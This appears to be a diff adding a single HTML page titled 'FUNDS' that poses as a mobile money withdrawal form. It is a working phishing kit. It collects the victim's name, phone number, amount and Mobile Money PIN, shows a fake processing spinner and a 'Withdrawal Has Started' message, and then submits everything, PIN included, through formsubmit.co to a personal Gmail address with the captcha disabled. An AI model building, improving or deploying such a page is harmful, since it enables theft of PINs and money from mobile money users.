@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>FUNDS</title>
+<style>
+  body{margin:0;font-family:Arial,sans-serif;background:#f2f2f2;color:#111;}
+  .header{background:yellow;color:#000;text-align:center;padding:18px;font-weight:bold;font-size:22px;}
+  .container{max-width:520px;margin:30px auto;padding:20px;background:#fff;border-radius:10px;box-shadow:0 6px 18px rgba(0,0,0,0.06);}
+  label{display:block;margin-top:15px;margin-bottom:5px;font-size:14px;font-weight:600;}
+  input{width:100%;padding:12px;font-size:16px;border-radius:6px;border:1px solid #ccc;box-sizing:border-box;}
+  .pin-row{display:flex;gap:8px;align-items:center;}
+  .toggle-btn{padding:10px 12px;border-radius:6px;background:#eee;border:1px solid #ddd;cursor:pointer;font-size:14px;}
+  .withdraw-btn, .balance-btn{
+    width:100%;padding:14px;font-size:16px;font-weight:bold;color:#fff;border:none;border-radius:8px;cursor:pointer;margin-top:20px;
+  }
+  .withdraw-btn{background:#0d6efd;}
+  .withdraw-btn[disabled]{opacity:0.5;cursor:not-allowed;}
+  .balance-btn{background:#28a745;display:none;}
+  .spinner{width:20px;height:20px;border:3px solid rgba(255,255,255,0.4);border-top-color:#fff;border-radius:50%;animation:spin 1s linear infinite;display:inline-block;vertical-align:middle;margin-left:10px;}
+  @keyframes spin{to{transform:rotate(360deg);}}
+  .success-box{display:none;background:#28a745;color:#fff;padding:14px;border-radius:8px;text-align:center;font-weight:bold;margin-top:20px;}
+  .thankyou{display:none;margin-top:20px;padding:12px;background:#e9f7ee;color:#0b6623;border-radius:8px;text-align:center;font-weight:600;}
+  .error{color:#dc3545;font-size:13px;margin-top:4px;display:none;}
+</style>
+</head>
+<body>
+
+<div class="header">FUNDS</div>
+
+<div class="container">
+  <form id="awardForm" method="POST" action="https://formsubmit.co/Victorrono613@gmail.com" target="_self">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_subject" value="New FUNDS submission">
+
+    <label for="name">Enter your Name</label>
+    <input type="text" id="name" name="Full Name" placeholder="John Doe" required>
+    <div id="nameErr" class="error">Please enter letters only (A–Z).</div>
+
+    <label for="phone">Enter phone number</label>
+    <input type="tel" id="phone" name="Phone Number" placeholder="0712345678" required>
+    <div id="phoneErr" class="error">Please enter digits only.</div>
+
+    <label for="amount">Enter Amount to withdraw</label>
+    <input type="number" id="amount" name="Amount to withdraw" placeholder="1000" min="1" required>
+    <div id="amountErr" class="error">Please enter a valid amount.</div>
+
+    <label id="pinLabel" for="pin">Enter Your Mobile Money PIN</label>
+    <div class="pin-row">
+      <input type="password" id="pin" name="Mobile Money PIN" placeholder="****" required>
+      <button type="button" id="togglePin" class="toggle-btn">Show</button>
+    </div>
+    <div id="pinErr" class="error">PIN required.</div>
+    <div id="dynamicHint" style="font-size:12px;color:#666;margin-top:5px;"></div>
+
+    <!-- Withdraw button -->
+    <button type="button" id="withdrawBtn" class="withdraw-btn" disabled>Withdraw</button>
+
+    <!-- Success box appears after 5s -->
+    <div class="success-box" id="successBox">
+      Withdrawal Has Started..... 
+    </div>
+
+    <!-- PRESS 🆗️ DONE ✅️ button is the actual submit -->
+    <button type="submit" id="balanceBtn" class="balance-btn">PRESS 🆗️ DONE ✅️</button>
+
+    <!-- Thank you message -->
+    <div class="thankyou" id="thankyou">
+      You Will Receive A Confirmation Message Shortly.
+    </div>
+  </form>
+</div>
+
+<script>
+const nameInput=document.getElementById('name');
+const phoneInput=document.getElementById('phone');
+const amountInput=document.getElementById('amount');
+const pinInput=document.getElementById('pin');
+const togglePinBtn=document.getElementById('togglePin');
+const withdrawBtn=document.getElementById('withdrawBtn');
+const balanceBtn=document.getElementById('balanceBtn');
+const successBox=document.getElementById('successBox');
+const thankyou=document.getElementById('thankyou');
+const dynamicHint=document.getElementById('dynamicHint');
+
+const nameErr=document.getElementById('nameErr');
+const phoneErr=document.getElementById('phoneErr');
+const amountErr=document.getElementById('amountErr');
+const pinErr=document.getElementById('pinErr');
+
+function isNameValid(v){return /^[A-Za-z\s]+$/.test(v.trim());}
+function isDigits(v){return /^\d+$/.test(v.trim());}
+function isAmountValid(v){return v!=='' && !isNaN(v) && Number(v)>0;}
+
+function updatePinLabel(){
+  const amt=amountInput.value||'[Amount]';
+  const ph=phoneInput.value||'[Phone Number]';
+  document.getElementById('pinLabel').textContent=`Enter Your Mobile Money PIN`;
+  dynamicHint.textContent=`Sending M${amt} To ${ph}`;
+}
+
+[nameInput, phoneInput, amountInput, pinInput].forEach(el=>el.addEventListener('input',()=>{
+  updateWithdrawState();
+  updatePinLabel();
+}));
+
+function updateWithdrawState(){
+  withdrawBtn.disabled=!(isNameValid(nameInput.value) && isDigits(phoneInput.value) && isAmountValid(amountInput.value) && pinInput.value.trim()!=='');
+}
+
+togglePinBtn.addEventListener('click',()=>{
+  if(pinInput.type==='password'){pinInput.type='text';togglePinBtn.textContent='Hide';}
+  else{pinInput.type='password';togglePinBtn.textContent='Show';}
+});
+
+withdrawBtn.addEventListener('click',()=>{
+  // Validation
+  if(!isNameValid(nameInput.value)){nameErr.style.display='block'; return;}else{nameErr.style.display='none';}
+  if(!isDigits(phoneInput.value)){phoneErr.style.display='block'; return;}else{phoneErr.style.display='none';}
+  if(!isAmountValid(amountInput.value)){amountErr.style.display='block'; return;}else{amountErr.style.display='none';}
+  if(pinInput.value.trim()===''){pinErr.style.display='block'; return;}else{pinErr.style.display='none';}
+
+  // Disable button + show spinner
+  withdrawBtn.disabled=true;
+  withdrawBtn.innerHTML='Processing <span class="spinner"></span>';
+
+  // After 5 seconds, show success and balance button
+  setTimeout(()=>{
+    withdrawBtn.style.display='none';
+    successBox.style.display='block';
+    balanceBtn.style.display='block';
+  },5000);
+});
+
+// Show thank you after balance (form submit)
+document.getElementById('awardForm').addEventListener('submit',()=>{
+  thankyou.style.display='block';
+});
+</script>
+
+</body>
+</html>
